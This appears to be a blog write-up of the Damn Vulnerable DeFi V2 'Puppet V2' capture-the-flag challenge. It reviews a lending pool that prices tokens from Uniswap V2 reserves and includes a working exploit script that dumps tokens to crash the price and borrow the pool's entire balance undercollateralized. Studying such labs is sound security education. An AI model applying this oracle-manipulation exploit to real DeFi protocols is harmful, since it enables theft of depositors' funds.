@@ -1,0 +1,104 @@
+# Damn Vulnerable DeFi V2 - #9 Puppet V2
+
+<p className="text-xs text-right">February 28, 2022 by [patrickd](/about#patrickd)</p>
+
+This is part 6 of the write-up series on Damn Vulnerable DeFi V2. Please consider attempting to solve it on your own first since it's a lot less fun after being spoiled!
+
+---
+
+>[**Challenge #9 - Puppet v2**](https://www.damnvulnerabledefi.xyz/challenges/9.html)
+>
+>The developers of the [last lending pool](https://www.damnvulnerabledefi.xyz/challenges/8.html) are saying that they've learned the lesson. And just released a new version!
+>
+>Now they're using a [Uniswap v2 exchange](https://docs.uniswap.org/protocol/V2/introduction) as a price oracle, along with the recommended utility libraries. That should be enough.
+>
+>You start with 20 ETH and 10000 DVT tokens in balance. The new lending pool has a million DVT tokens in balance. You know what to do ;)
+
+
+## Code Review
+
+As usual, we start by looking at the testcases. In [puppet-v2.challenge.js](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/test/puppet-v2/puppet-v2.challenge.js) we find a quite complex looking scenario setup script, essentially doing the following things:
+
+1. Gives the attacker account 20 ether
+2. Deploy DamnValuableToken and Wrapped Ether token contract (WETH9)
+3. Deploys the UniswapRouter and uses it to create a DVT-WETH pair with 100 DVT and 10 WETH of liquidity
+4. Deploys PuppetV2Pool and provides it with 1.000.000 DVT
+5. Gives the attacker 10.000 DVT
+
+There are also things happening like the initialization of a UniswapFactory contract that gets passed to the Router contract. Or the fact that addresses of WETH, DVT, the exchange pair, and the factory contracts, all get passed as construction arguments into the PuppetV2Pool - but for now we can just skip over those details since they're unlikely to play much of a role in solving the challenge.
+
+The success conditions are simple: The pool must have 0 DVT while the attacker must have at least as much DVT as the pool initially had - meaning the attacker must steal all of the pool's token.
+
+---
+
+Unlike in the previous challenge, this time the Uniswap contracts are [included via the NPM package manager](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/package.json#L30-L31), so there's little doubt that they're in their original state and unlikely to be vulnerable. The [WETH9 contract](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/contracts/WETH9.sol), used for wrapping ether into the WETH ERC20 token, is a well established contract and was copied without changes as well.
+
+Therefore, the only thing we have to look at right now is [PuppetV2Pool.sol](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/contracts/puppet-v2/PuppetV2Pool.sol), which looks quite similar to [PuppetPool.sol](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/contracts/puppet/PuppetPool.sol) from the previous challenge. The first significant change I noticed was the fact that now 3 (instead of 2) times as much ether as the borrowing value needs to be deposited as collateral.
+
+Furthermore, as explained by the challenge description, the function determining the token price is now indeed using the official utility library of Uniswap:
+
+```typescript
+// Fetch the price from Uniswap v2 using the official libraries
+function _getOracleQuote(uint256 amount) private view returns (uint256) {
+    (uint256 reservesWETH, uint256 reservesToken) = UniswapV2Library.getReserves(
+        _uniswapFactory, address(_weth), address(_token)
+    );
+    return UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH);
+}
+```
+
+Looking at this naively would make you think along the lines of: This is the recommended way of determining the price, so this should be safe to use!
+
+But if you actually look at the library you'll realize that the "magic" is not much different to [how price calculation worked in V1](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/contracts/puppet/PuppetPool.sol#L49-L52):
+
+```typescript
+library UniswapV2Library {
+    ...
+    // given some amount of an asset and pair reserves, returns an equivalent amount of the other asset
+    function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) {
+        ...
+        amountB = amountA.mul(reserveB) / reserveA;
+    }
+    ...
+}
+```
+
+Note that, since this is an internal library function it will be inlined into the PuppetV2Pool contract during compilation.
+
+
+## Exploit
+
+Just like in the [previous challenge](https://ventral.digital/posts/2022/2/23/damn-vulnerable-defi-v2-8-puppet), we again simply have to manipulate the amount of reserves: By selling as many tokens as possible we can increase the reserve amount of DVT while decreasing the amount of ether. This will effectively cause a price drop that will allow us to again take an undercollateralized loan that we don't intend to ever pay back.
+
+Now we just have to rewrite the previous exploit to use Uniswap V2 instead of V1 for making the swap, and to use WETH instead of ether:
+
+```javascript filename="puppet-v2.challenge.js" copy
+it('Exploit', async function () {
+    // Swap all attacker's initial tokens for ether to dump DVT price.
+    await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+    await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
+            ATTACKER_INITIAL_TOKEN_BALANCE,                  // Swap lall of the attacker's tokens.
+            0,                                               // We don't care how much ether we get back.
+            [this.token.address, this.uniswapRouter.WETH()], // Swap path from token to ether.
+            attacker.address,                                // Ether to attacker account.
+            9999999999                                       // No deadline.
+    );
+    // Attacker now has about 30 ether:
+    console.log('Attacker`s eth balance:', (await ethers.provider.getBalance(attacker.address)).toString());
+
+    // Collateral required to borrow all of the pool's DVT is now about 29.5 ether.
+    const collateral = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+    console.log('Required collateral in eth:', collateral.toString());
+    // Convert ether to WETH, give allowance to pool contract and use it to borrow DVT.
+    await this.weth.connect(attacker).deposit({ value: collateral });
+    await this.weth.connect(attacker).approve(this.lendingPool.address, collateral);
+    await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
+});
+```
+
+At least this time the Uniswap documentation was quite informative and it didn't take long to implement the changes.
+
+
+## Conclusion
+
+There's not much new to say since this challenge was very similar to the previous one. But if there's one key take away, it's that you can't blindly trust the "recommended way" of doing things. You should still try to understand what is actually happening under the hood, what drawbacks it has and whether you're actually using it as intended.
